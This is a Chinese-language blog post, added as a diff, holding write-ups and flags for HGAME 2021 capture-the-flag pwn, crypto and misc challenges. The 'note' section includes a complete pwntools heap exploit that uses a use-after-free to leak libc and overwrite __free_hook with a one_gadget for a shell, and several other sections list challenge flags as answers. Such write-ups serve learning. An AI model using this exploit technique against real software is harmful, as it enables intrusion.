@@ -1,0 +1,965 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zn-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="HGAME 2021week1pwnwhitegive">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hgame2021">
+<meta property="og:url" content="https://caiii-vegtable.github.io/2021/01/30/hgame2021/index.html">
+<meta property="og:site_name" content="inHaus&#39;blog">
+<meta property="og:description" content="HGAME 2021week1pwnwhitegive">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/1.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/1-1612757204598.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/2.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/1-1612075469157.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/1-1612078870896.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/1-1613365748173.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/2-1613365895762.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/3.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/4.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/5.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/6.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/7.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/8.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/9.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/10.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/1-1612622116732.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/2-1614044357200.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/1-1614044363080.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/3-1614045221996.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/4-1614047759813.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/5-1614047818021.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/1-1614322631404.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/2-1614322645230.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/3-1614322755482.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/4-1614322939233.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/1-1614064752803.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/2-1614064767644.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/3-1614064848863.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/4-1614065200144.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/5-1614066292554.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/6-1614066431150.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/7-1614067129891.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/8-1614067979489.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/hgame2021/9-1614069470717.png">
+<meta property="article:published_time" content="2021-01-30T11:24:13.000Z">
+<meta property="article:modified_time" content="2021-10-26T08:49:20.211Z">
+<meta property="article:author" content="caiii-vegtable">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://caiii-vegtable.github.io/image/hgame2021/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://caiii-vegtable.github.io/2021/01/30/hgame2021/"/>
+
+
+
+
+
+  <title>hgame2021 | inHaus'blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zn-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">inHaus'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://caiii-vegtable.github.io/2021/01/30/hgame2021/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="caiii-vegtable">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inHaus'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">hgame2021</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-01-30T19:24:13+08:00">
+                2021-01-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="HGAME-2021"><a href="#HGAME-2021" class="headerlink" title="HGAME 2021"></a>HGAME 2021</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="whitegive"><a href="#whitegive" class="headerlink" title="whitegive"></a>whitegive</h4><a id="more"></a>
+
+<p><img src="/image/hgame2021/1.png" alt="1"></p>
+<p>比较rdx和rax的值，相同就给shell</p>
+<p>rax中是字符串paSsw0rd的地址0x402012，十进制是4202514</p>
+<p>输入就可以了。</p>
+<p>hgame{W3lCOme_t0_Hg4m3_2222Z222zO2l}</p>
+<h4 id="letter"><a href="#letter" class="headerlink" title="letter"></a>letter</h4><p>checksec</p>
+<p><img src="/image/hgame2021/1-1612757204598.png" alt="1"></p>
+<p>ida</p>
+<p><img src="/image/hgame2021/2.png" alt="2"></p>
+<p>length是有符号数比较，然后再无符号数作为长度，输入负数可以整数溢出。</p>
+<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="まひと"><a href="#まひと" class="headerlink" title="まひと"></a>まひと</h4><p>先摩斯密码，再ascii，再base64</p>
+<p>VmlnZW5lcmUtTGlraTp9VmttdkpiITFYdEF4ZSFocE0xe00rOXhxenJUTV9Oan5jUmc0eA==</p>
+<p>再维吉尼亚</p>
+<p>Vigenere-Liki:}VkmvJb!1XtAxe!hpM1{M+9xqzrTM_Nj~cRg4x</p>
+<p>}MealIc!1OnOnd!igG1{A+9npaiNA_Di~dIa4l</p>
+<p>}CtitEr!1EnIns!anT1{E+9eminGE_Ar~cEn4t</p>
+<p>}UnruOc!1SeDst!waL1{R+9sheyER_Co~bYr4g</p>
+<p>}KccnYt!1NlPpu!zeE1{C+9pfrhLB_Fz~uGy4n</p>
+<p>x4gRc~jN_MTrzqx9+M{1Mph!exAtX1!bJvmkV}</p>
+<p>p4nCo~tH_EAclar9+E{1Tat!orSaI1!nTperG}</p>
+<p>s4iGl~eT_ULlome9+S{1Bet!stIsT1!iRcesC}</p>
+<p>e4rGp~rO_LEabla9+L{1Flu!taRhE1!wOworC}</p>
+<p>m4yHu~yF_CLgrgp9+B{1Efz!tpQlM1!tZnbcL}</p>
+<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h4><p>先base64，再base32，最后base16</p>
+<p>hgame{We1c0me_t0_HG4M3_2021}</p>
+<h4 id="不起眼压缩包的养成的方法"><a href="#不起眼压缩包的养成的方法" class="headerlink" title="不起眼压缩包的养成的方法"></a>不起眼压缩包的养成的方法</h4><p>图片下载后binwalk -e分离zip</p>
+<p>有密码，8位数字爆破</p>
+<p>有相同的no password文件，利用zip明文破解密钥为C8uvP$DP</p>
+<p>得到flag.zip，010editor打开，看到中间的&amp;#开头的字符，html编码，可以在线解密</p>
+<p>hgame{2IP_is_Usefu1_and_Me9umi_i5_W0r1d}</p>
+<h4 id="Galaxy"><a href="#Galaxy" class="headerlink" title="Galaxy"></a>Galaxy</h4><p>pcapng文件中导出http对象，导出png图片</p>
+<p><img src="/image/hgame2021/1-1612075469157.png" alt="1"></p>
+<p>图片在linux无法打开，时高宽有问题，先尝试直接改动高宽，在图片下面发现了flag</p>
+<p>hgame{Wh4t_A_W0nderfu1_Wa11paper}</p>
+<h4 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h4><p>附件为两个word</p>
+<p>将first先解压了，看到有关password,打开查看</p>
+<p>发现是brainfuck编码</p>
+<p>在线解码DOYOUKNOWHIDDEN?</p>
+<p>打开word，显示隐藏文字，全是tab和空格，图片提到雪，是snow隐写。</p>
+<p>将这些tab和空格取消隐藏后复制到txt中，用网上的脚本解出flag。</p>
+<p><img src="/image/hgame2021/1-1612078870896.png" alt="1"></p>
+<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn"></a>pwn</h3><h4 id="note"><a href="#note" class="headerlink" title="note"></a>note</h4><p><img src="/image/hgame2021/1-1613365748173.png" alt="1"></p>
+<p>ida</p>
+<p>delete函数free后指针没有置零，存在UAF</p>
+<p><img src="/image/hgame2021/2-1613365895762.png" alt="2"></p>
+<p>libc是2.27的，有tcache</p>
+<p>思路：</p>
+<p>通过分配大堆块，free后到unsorted bin，fd和bk指向main_arena加上一个偏移位置。show函数泄露地址，计算libc基址和free_hook地址。再次通过UAF修改fd的指针指向free_hook，通过edit修改为one_gadget。free一个堆块触发。</p>
+<p>交互函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">'./note'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">take</span><span class="params">(length)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'5.exit'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'how long do you like to write?'</span>,str(length))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'5.exit'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'which note do you like to delete?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'5.exit'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'which note do you like to edit?'</span>,str(idx))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'5.exit'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'which note do you like to show?'</span>,str(idx))</span><br></pre></td></tr></table></figure>
+
+<p>首先释放大堆块，tcache的最大堆块为0x400。我们申请0x500大小，然后释放</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">take(<span class="number">0x500</span>)</span><br><span class="line">take(<span class="number">0x500</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/hgame2021/3.png" alt="3"></p>
+<p><img src="/image/hgame2021/4.png" alt="4"></p>
+<p>可以看到这里指针指向了main_arena+96的地方。</p>
+<p>main_arena距离__malloc_hook的距离可以通过libc查看</p>
+<p>在malloc_trim函数中</p>
+<p><img src="/image/hgame2021/5.png" alt="5"></p>
+<p><img src="/image/hgame2021/6.png" alt="6"></p>
+<p>这里相差0x10</p>
+<p>所有计算libc基址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leak_addr)</span><br><span class="line">libcbase=leak_addr-libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span><span class="number">-96</span></span><br><span class="line"><span class="keyword">print</span> hex(libcbase)</span><br></pre></td></tr></table></figure>
+
+<p>one_gadget</p>
+<p><img src="/image/hgame2021/7.png" alt="7"></p>
+<p>计算one_gadget和free_hook地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free_hook = libc_addr + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">one = libc_addr + <span class="number">0x4f432</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来申请并释放一个堆到tcache，修改fd为free_hook</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">take(<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(free_hook))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/hgame2021/8.png" alt="8"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">take(<span class="number">0x50</span>)</span><br><span class="line">take(<span class="number">0x50</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(one_gadget))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/hgame2021/9.png" alt="9"></p>
+<p>可以看到free_hook已经被修改</p>
+<p>随意释放一个堆就可以触发</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">'./note'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">take</span><span class="params">(length)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'5.exit'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'how long do you like to write?'</span>,str(length))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'5.exit'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'which note do you like to delete?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'5.exit'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'which note do you like to edit?'</span>,str(idx))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'5.exit'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'which note do you like to show?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">take(<span class="number">0x500</span>)</span><br><span class="line">take(<span class="number">0x500</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leak_addr)</span><br><span class="line">libcbase=leak_addr-libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span><span class="number">-96</span></span><br><span class="line"><span class="keyword">print</span> hex(libcbase)</span><br><span class="line">free_hook = libcbase + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = libcbase + <span class="number">0x4f432</span></span><br><span class="line">take(<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(free_hook))</span><br><span class="line">take(<span class="number">0x50</span>)</span><br><span class="line">take(<span class="number">0x50</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/hgame2021/10.png" alt="10"></p>
+<p>hgame{0ce14ff5603d093c6bdbc55e63f0a573ed6a040300166e96972f05de99d54288}</p>
+<h3 id="crypto-1"><a href="#crypto-1" class="headerlink" title="crypto"></a>crypto</h3><h4 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h4><p>这里c = a ** p * m % p需要乘上a^p的模逆，根据费马定理a^p-1 mod p = 1,就是乘上a的模逆。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line">m = s2n(FLAG)</span><br><span class="line">a = number.getPrime(<span class="number">1024</span>)</span><br><span class="line">p = number.getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">c = a ** p * m % p</span><br><span class="line"></span><br><span class="line">print(<span class="string">"a = &#123;&#125;"</span>.format(a))</span><br><span class="line">print(<span class="string">"p = &#123;&#125;"</span>.format(p))</span><br><span class="line">print(<span class="string">"c = &#123;&#125;"</span>.format(c))</span><br><span class="line"><span class="comment"># a = 142094201253648769422482097114999381751352834656889584857654563032957752101249407999188218439474542473287958699459690843552567036789344889276104556950725370293052897033816154628895151970136570525461979511846509856048733005149376324742955782874856170152463133458339671218040223372988708102781320048353253641589</span></span><br><span class="line"><span class="comment"># p = 154990989898029995420949219287026923198387506265077758335386785829474176535381459454924034993055563370896367990156236156839492569911537559020894771352216047479804536470527969433499076980184885567579005320550402987847078664793336321365697165035820982816099386528834101325749877194910242042415578855102693499897</span></span><br><span class="line"><span class="comment"># c = 67465069083704513679604569168632159768849281471185466089090763953280462647146789465117251844412662000821026267062541600051192897592455375128713220353031669539877380292152767659111517852617638201505375654885614358019072649918328970185394923467767850965448433635073210688365212408993181556013175334712256868070</span></span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">a = <span class="number">142094201253648769422482097114999381751352834656889584857654563032957752101249407999188218439474542473287958699459690843552567036789344889276104556950725370293052897033816154628895151970136570525461979511846509856048733005149376324742955782874856170152463133458339671218040223372988708102781320048353253641589</span></span><br><span class="line">p = <span class="number">154990989898029995420949219287026923198387506265077758335386785829474176535381459454924034993055563370896367990156236156839492569911537559020894771352216047479804536470527969433499076980184885567579005320550402987847078664793336321365697165035820982816099386528834101325749877194910242042415578855102693499897</span></span><br><span class="line">c = <span class="number">67465069083704513679604569168632159768849281471185466089090763953280462647146789465117251844412662000821026267062541600051192897592455375128713220353031669539877380292152767659111517852617638201505375654885614358019072649918328970185394923467767850965448433635073210688365212408993181556013175334712256868070</span></span><br><span class="line">q = gmpy2.invert(a,p)</span><br><span class="line">m = c*q%p</span><br><span class="line">flag = libnum.n2s(m)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+
+<p>hgame{M0du1@r_m4th+1s^th3~ba5is-Of=cRypt0!!}</p>
+<h4 id="gcd-or-more"><a href="#gcd-or-more" class="headerlink" title="gcd or more"></a>gcd or more</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line">p = <span class="number">85228565021128901853314934583129083441989045225022541298550570449389839609019</span></span><br><span class="line">q = <span class="number">111614714641364911312915294479850549131835378046002423977989457843071188836271</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">cipher = pow(s2n(FLAG), <span class="number">2</span>, n)</span><br><span class="line">print(cipher)</span><br><span class="line"><span class="comment"># 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看出是rabin加密</p>
+<p><a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_e_attack/#rsa-rabin" target="_blank" rel="noopener">https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_e_attack/#rsa-rabin</a></p>
+<p><img src="/image/hgame2021/1-1612622116732.png" alt="1"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span 